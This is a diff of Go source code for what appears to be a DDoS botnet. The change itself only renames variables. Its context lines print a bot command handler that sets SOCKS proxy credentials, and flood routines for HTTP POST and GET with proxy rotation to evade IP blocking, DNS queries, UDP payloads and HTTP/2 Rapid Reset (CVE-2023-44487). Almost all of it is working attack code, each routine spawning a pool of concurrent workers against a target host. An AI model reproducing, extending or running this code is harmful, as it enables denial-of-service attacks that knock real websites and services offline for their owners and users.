@@ -213,8 +213,8 @@ func blackEnergy(conn net.Conn, command string) error {
 			return fmt.Errorf("usage: !socksauth <username> <password>")
 		}
 		socksCredsMutex.Lock()
-		socksUsername = fields[1]
-		socksPassword = fields[2]
+		proxyUser = fields[1]
+		proxyPass = fields[2]
 		socksCredsMutex.Unlock()
 		conn.Write([]byte(fmt.Sprintf("SOCKS: Auth updated (user: %s)\n", fields[1])))
 	default:
@@ -1006,7 +1006,7 @@ func alakazam(target string, targetPort, duration int) {
 }
 
 // alakazamProxy performs HTTP POST flood with optional proxy rotation.
-// Spawns cozyBear (default 2024) concurrent workers sending POST requests.
+// Spawns workerPool (default 2024) concurrent workers sending POST requests.
 // In proxy mode, rotates proxies periodically to avoid IP blocking.
 // Parameters:
 //   - target: Target hostname or IP
@@ -1043,7 +1043,7 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 		}
 	}
 
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1130,7 +1130,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 		paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
 		methods := []string{"GET", "POST", "HEAD"}
 
-		for i := 0; i < cozyBear; i++ {
+		for i := 0; i < workerPool; i++ {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
@@ -1195,7 +1195,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: hostname, MinVersion: tls.VersionTLS12, MaxVersion: tls.VersionTLS13}
 	paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
 	methods := []string{"GET", "POST", "HEAD"}
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1470,8 +1470,8 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 	_ = fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort) // targetURL kept for reference
 	paths := []string{"/", "/index.php", "/wp-login.php", "/admin", "/api/v1/", "/search?q=" + turla(8), "/cdn-cgi/trace"}
 	sessionWorkers := 50
-	if cozyBear < sessionWorkers {
-		sessionWorkers = cozyBear
+	if workerPool < sessionWorkers {
+		sessionWorkers = workerPool
 	}
 	for i := 0; i < sessionWorkers; i++ {
 		wg.Add(1)
@@ -1548,7 +1548,7 @@ func dragonite(targetIP string, targetPort, duration int) {
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1602,7 +1602,7 @@ func tyranitar(targetIP string, targetPort int, duration int) error {
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1656,7 +1656,7 @@ func metagross(targetIP string, duration int) error {
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1711,7 +1711,7 @@ func salamence(targetIP string, targetPort, duration int) {
 	var wg sync.WaitGroup
 	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
 	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1779,7 +1779,7 @@ func snorlax(targetIP string, targetPort, duration int) {
 	defer cancel()
 	var wg sync.WaitGroup
 	payload := make([]byte, 1024)
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1823,7 +1823,7 @@ func gengar(targetIP string, targetPort, duration int) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 	var wg sync.WaitGroup
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -1853,7 +1853,7 @@ func randUA() string {
 }
 
 // darkrai performs HTTP/2 Rapid Reset flood (CVE-2023-44487).
-// Spawns cozyBear concurrent workers sending HEADERS+RST_STREAM pairs.
+// Spawns workerPool concurrent workers sending HEADERS+RST_STREAM pairs.
 // Parameters:
 //   - target: Target hostname or IP
 //   - targetPort: Target port (typically 443)
@@ -1897,7 +1897,7 @@ func darkraiProxy(target string, targetPort, duration int, useProxy bool) {
 	}
 
 	var wg sync.WaitGroup
-	for i := 0; i < cozyBear; i++ {
+	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
